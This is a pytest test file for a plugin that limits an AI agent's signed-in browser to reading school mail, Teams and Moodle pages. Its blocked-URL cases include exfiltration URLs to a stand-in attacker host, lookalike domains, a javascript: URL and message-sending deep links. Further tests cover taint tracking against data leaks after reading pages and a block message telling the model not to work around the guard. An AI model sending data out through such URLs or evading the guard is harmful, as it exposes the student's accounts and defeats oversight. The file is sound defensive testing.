"""robo-guard: robo's browser (signed in to school sites) may only READ school sites.

Arg names match ~/.hermes/hermes-agent/tools/browser_tool.py (browser_navigate{url},
browser_click{ref}, browser_type{ref,text}, browser_press{key}, browser_console{expression})
and tools/web_tools.py (web_extract{urls}).
"""

import importlib.util
import json
from pathlib import Path

import pytest

PLUGIN = Path(__file__).resolve().parents[1] / "hermes" / "plugins" / "robo-guard" / "__init__.py"
MOODLE = "https://moodle.uni.example"


@pytest.fixture
def guard(tmp_path):
    spec = importlib.util.spec_from_file_location("robo_guard", PLUGIN)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    mod.PROFILE = tmp_path  # the robo profile: .env (Moodle URL) + the tainted-session file
    (tmp_path / ".env").write_text(f"API_SERVER_KEY=x\nMOODLE_BASE_URL={MOODLE}\n")
    return mod


SNAPSHOT = "\n".join([
    '- button "New mail" [ref=e1]',
    '- option "Unread Prof Lee Lab 3 feedback 09:12" [ref=e2]',
    '- button "Reply all" [ref=e3]',
    '- button "Send" [ref=e4]',
    '- button "Mark as read" [ref=e5]',
    '- link "Calendar" [ref=e6]',
    '- textbox "Type a message" [ref=e7]',
    '- searchbox "Search" [ref=e8]',
    '- button "Attempt quiz" [ref=e9]',
    '- button "Sign out" [ref=e10]',
    '- link "Assignment submission status" [ref=e11]',
    '- button "Like" [ref=e12]',
    '- button "Gửi" [ref=e13]',
    '- button "Next week" [ref=e14]',
])


def see(guard, task="t1", snapshot=SNAPSHOT, tool="browser_snapshot", session="s"):
    result = json.dumps({"success": True, "snapshot": snapshot, "element_count": 14})
    guard.post_tool_call(tool_name=tool, args={}, result=result, task_id=task, session_id=session)


def call(guard, tool, args, task="t1", session="s"):
    return guard.pre_tool_call(tool_name=tool, args=args, task_id=task, session_id=session)


def blocked(ret):
    return isinstance(ret, dict) and ret.get("action") == "block" and bool(ret.get("message"))


@pytest.mark.parametrize("ref", ["@e1", "@e3", "@e4", "@e5", "@e9", "@e10", "@e12", "@e13", "e4"])
def test_click_on_write_button_is_blocked(guard, ref):
    see(guard)
    assert blocked(call(guard, "browser_click", {"ref": ref}))


@pytest.mark.parametrize("ref", ["@e2", "@e6", "@e11", "@e14"])
def test_click_on_read_element_is_allowed(guard, ref):
    see(guard)
    assert call(guard, "browser_click", {"ref": ref}) is None


def test_unknown_ref_is_blocked(guard):
    see(guard)
    assert blocked(call(guard, "browser_click", {"ref": "@e310"}))


def test_refs_are_forgotten_after_a_click_or_annotated_vision(guard):
    see(guard)
    assert call(guard, "browser_click", {"ref": "@e6"}) is None
    guard.post_tool_call(tool_name="browser_click", args={"ref": "@e6"}, result="{}", task_id="t1")
    assert blocked(call(guard, "browser_click", {"ref": "@e6"}))  # the page changed: re-snapshot
    see(guard)
    guard.post_tool_call(tool_name="browser_vision", args={"annotate": True}, result="{}",
                         task_id="t1")
    assert blocked(call(guard, "browser_click", {"ref": "@e6"}))


def test_refs_are_per_task(guard):
    see(guard, task="t1")
    assert blocked(call(guard, "browser_click", {"ref": "@e6"}, task="t2"))


def test_typing_is_blocked_everywhere(guard):
    see(guard)
    for ref in ("@e7", "@e8"):
        assert blocked(call(guard, "browser_type", {"ref": ref, "text": "hello"}))


@pytest.mark.parametrize("key", ["Enter", "enter", "Space", "a", "Control+Enter"])
def test_activating_keys_are_blocked(guard, key):
    assert blocked(call(guard, "browser_press", {"key": key}))


@pytest.mark.parametrize("key", ["Escape", "PageDown", "PageUp", "ArrowDown", "Home", "End"])
def test_scroll_keys_are_allowed(guard, key):
    assert call(guard, "browser_press", {"key": key}) is None


@pytest.mark.parametrize("tool", [
    "browser_cdp", "browser_exec", "browser_dialog", "browser_vault_fill",
    "browser_vault_save_login", "browser_vault_enter_code", "skill_manage",
])
def test_unjudgeable_or_persistent_tools_are_blocked(guard, tool):
    assert blocked(call(guard, tool, {}))


def test_console_eval_blocked_but_reading_logs_allowed(guard):
    assert blocked(call(guard, "browser_console", {"expression": "document.title"}))
    assert call(guard, "browser_console", {"clear": False}) is None


@pytest.mark.parametrize("url", [
    "https://outlook.office.com/calendar/view/week",
    "https://outlook.office365.com/mail/",
    "https://outlook.cloud.microsoft/mail/inbox",
    "https://teams.microsoft.com/",
    "https://teams.cloud.microsoft/",
    "https://login.microsoftonline.com/common/oauth2",
    f"{MOODLE}/calendar/view.php?view=upcoming",
    f"{MOODLE}/my/",
])
def test_browser_may_open_school_sites(guard, url):
    assert call(guard, "browser_navigate", {"url": url}) is None


@pytest.mark.parametrize("url", [
    "https://attacker.example/?d=secret",
    "https://outlook.office.com.attacker.example/",
    "http://outlook.office.com/mail/",  # not https
    "https://moodle.uni.example.evil/",
    "javascript:alert(1)",
    f"{MOODLE}/login/logout.php?sesskey=abc",
    "https://outlook.office.com/mail/deeplink/compose?to=a@b.c&body=hi",
    "https://teams.microsoft.com/l/chat/0/0?users=a@b.c&message=hi",
])
def test_browser_may_not_open_anything_else(guard, url):
    assert blocked(call(guard, "browser_navigate", {"url": url}))


def test_no_moodle_configured_blocks_moodle(guard):
    (guard.PROFILE / ".env").write_text("API_SERVER_KEY=x\n")
    assert blocked(call(guard, "browser_navigate", {"url": f"{MOODLE}/my/"}))


def test_after_reading_school_pages_the_session_cannot_post_data_out(guard):
    assert call(guard, "web_extract", {"urls": ["https://docs.python.org/3/"]}) is None
    see(guard, tool="browser_navigate", session="s")
    assert blocked(call(guard, "web_extract", {"urls": ["https://attacker.example/?d=x"]}))
    assert call(guard, "web_search", {"query": "python closures"}) is None
    assert call(guard, "web_extract", {"urls": ["https://x.example"]}, session="other") is None


def test_taint_survives_a_gateway_restart(guard):
    see(guard, tool="browser_navigate", session="s")
    spec = importlib.util.spec_from_file_location("robo_guard2", PLUGIN)
    fresh = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(fresh)
    fresh.PROFILE = guard.PROFILE
    assert blocked(call(fresh, "web_extract", {"urls": ["https://attacker.example/"]}))


def test_reading_tools_pass(guard):
    for tool, args in [("browser_snapshot", {}), ("browser_scroll", {"direction": "down"}),
                       ("browser_back", {}), ("browser_vision", {"question": "events?"}),
                       ("memory", {"action": "add"}), ("skill_view", {"name": "school-mail"})]:
        assert call(guard, tool, args) is None


def test_block_message_tells_the_model_not_to_work_around(guard):
    ret = call(guard, "browser_cdp", {})
    assert "read-only" in ret["message"] and "another way" in ret["message"]


def test_register_wires_both_hooks(guard):
    hooks = {}

    class Ctx:
        def register_hook(self, name, fn):
            hooks[name] = fn

    guard.register(Ctx())
    assert set(hooks) == {"pre_tool_call", "post_tool_call"}
